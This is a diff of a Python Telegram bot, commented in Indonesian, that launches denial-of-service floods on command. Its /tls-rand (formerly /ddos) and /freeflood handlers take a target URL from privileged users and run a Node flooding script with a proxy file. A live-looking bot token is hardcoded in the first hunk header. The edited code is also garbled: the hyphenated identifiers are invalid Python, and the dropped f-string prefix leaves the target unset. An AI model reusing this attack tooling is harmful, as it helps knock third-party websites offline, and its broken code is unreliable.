@@ -8,8 +8,8 @@ bot = telebot.TeleBot('6388514873:AAFkOzS34BRXKJAs7T2RT0tfVjwwJAvlIb0')
 # Daftar pengguna VVIP
 vvip_users = []
 
-# Variabel status serangan DDOS
-is_ddos_running = False
+# Variabel status serangan tls-rand
+is_tls-rand_running = False
 is_freeflood_running = False    
 
 # Menangani perintah /addvip
@@ -23,30 +23,30 @@ def handle_addvip(message):
     else:
         bot.reply_to(message, "Anda tidak memiliki izin untuk menambahkan pengguna VVIP.")
 
-# Menangani perintah /ddos
-@bot.message_handler(commands=['ddos'])
-def handle_ddos(message):
+# Menangani perintah /tls-rand
+@bot.message_handler(commands=['tls-rand'])
+def handle_tls-rand(message):
     # Verifikasi pengguna VVIP
     if message.from_user.id in vvip_users:
-        global is_ddos_running
-        if not is_ddos_running:
+        global is_tls-rand_running
+        if not is_tls-rand_running:
             msg = bot.send_message(message.chat.id, "Masukkan target:")
-            bot.register_next_step_handler(msg, perform_ddos)
+            bot.register_next_step_handler(msg, perform_tls-rand)
         else:
-            bot.reply_to(message, "Serangan DDOS sedang berjalan.")
+            bot.reply_to(message, "Serangan tls-rand sedang berjalan.")
     else:
         bot.reply_to(message, "Anda tidak memiliki izin untuk menggunakan fitur ini.")
 
-# Menjalankan serangan DDOS
-def perform_ddos(message):
-    global is_ddos_running
+# Menjalankan serangan tls-rand
+def perform_tls-rand(message):
+    global is_tls-rand_running
     url = message.text
     bot.send_message(message.chat.id, "Serangan dimulai")
-    is_ddos_running = True
-    os.system(f"node POWERFUL.js {url} 60 95500 ssl.txt")
+    is_tls-rand_running = True
+    os.system("node POWERFUL.js {url} 60 95500 ssl.txt")
     time.sleep(60)  # Tunggu selama 60 detik
-    is_ddos_running = False
-    bot.send_message(message.chat.id, "Serangan DDOS telah dihentikan.")
+    is_tls-rand_running = False
+    bot.send_message(message.chat.id, "Serangan telah dihentikan.")
 
 @bot.message_handler(commands=['freeflood'])
 def handle_freeflood(message):
@@ -64,7 +64,7 @@ def perform_freeflood(message):
     bot.send_message(message.chat.id, "Serangan freeflood dimulai")
     is_freeflood_running = True
     # Tambahkan logika serangan freeflood di sini
-    os.system("node tls.js {url} 20")
+    os.system("node POWERFUL.js {url} 20 95500 ssl.txt")
     time.sleep(20)  # Tunggu selama 60 detik
     is_freeflood_running = False
     bot.send_message(message.chat.id, "Serangan freeflood telah dihentikan.")
